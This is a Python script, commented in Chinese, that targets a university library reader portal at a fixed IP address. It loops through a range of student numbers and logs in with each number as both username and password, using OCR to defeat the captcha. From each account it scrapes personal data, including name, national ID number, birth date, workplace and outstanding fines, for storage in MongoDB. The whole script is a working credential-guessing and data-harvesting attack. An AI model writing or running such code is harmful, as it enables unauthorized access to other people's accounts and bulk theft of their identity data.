import requests
from bs4 import BeautifulSoup
import time
import http.cookiejar as cookielib
import pymongo
import pytesseract
from PIL import Image
# 连接mongodb
client = pymongo.MongoClient("localhost", 27017)
walden = client['scraping']
library_info = walden['info']
# 设置headers
headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, sdch',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Host': '202.196.13.8:8080',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36'

}
# 打开session。
session = requests.Session()
# 保存cookies
session.cookies = cookielib.LWPCookieJar(filename='cookies')
try:
    # session加载cookies
    session.cookies.load(ignore_discard=True)
except:
    print("Cookie 未能加载")


def get_captcha():
    captcha_url = "http://202.196.13.8:8080/reader/captcha.php"
    x = 0
    bin = session.get(captcha_url, headers=headers).content
    with open("/home/jasd/python/{0}".format(x), "wb")as file:
        file.write(bin)
        file.close()
    image = Image.open("/home/jasd/python/0.jpg")
    code = pytesseract.image_to_string(image)
    return code
# get_chaptcha()主要使用tesseract来通过subprocess来将验证码识别
# login()为登陆函数，可采集集信息， 并放置于mongodb中


def login(xuehao):
    from_data = {
        'number': xuehao,
        'passwd': xuehao,
        'captcha': get_captcha(),
        'select': 'cert_no',
        'returnUrl': '',
        }
    session.post("http://202.196.13.8:8080/reader/redr_verify.php",
                 data=from_data, headers=headers)
    info = session.get("http://202.196.13.8:8080/reader/redr_info.php",
                       headers=headers).content.decode("UTF-8")
    soup = BeautifulSoup(info, "lxml")
    if soup.find('div', {'id': 'container'}):
        mylib_info = soup.findAll("td")
        mylib_msg = soup.findAll("a", {'href': "book_lst.php"})

        data = {
	        '姓名': mylib_info[1].get_text().split("：")[1],
	        '证件号': mylib_info[2].get_text().split("：")[1],
	        '累计借书': mylib_info[12].get_text().split("：")[1],
	        '五天内即将过期图书': mylib_msg[1].get_text().split("[")[1].split("]")[0],
	        '已超期图书': mylib_msg[2].get_text().split("[")[1].split("]")[0],
	        '欠款金额': mylib_info[14].get_text().split("：")[1],
	        '身份证号': mylib_info[17].get_text().split("：")[1],
	        '工作单位': mylib_info[18].get_text().split("：")[1],
	        '职业/职称': mylib_info[19].get_text().split("：")[1],
	        '性别': mylib_info[21].get_text().split("：")[1],
	        '出生日期': mylib_info[26].get_text().split("：")[1],
	        }

        print(data)
        # library_info.insert_one(data)
        # session.cookies.save()
    else:
        pass


if __name__ == '__main__':
    for i in range(541510020101, 541510020161):
        login(str(i))
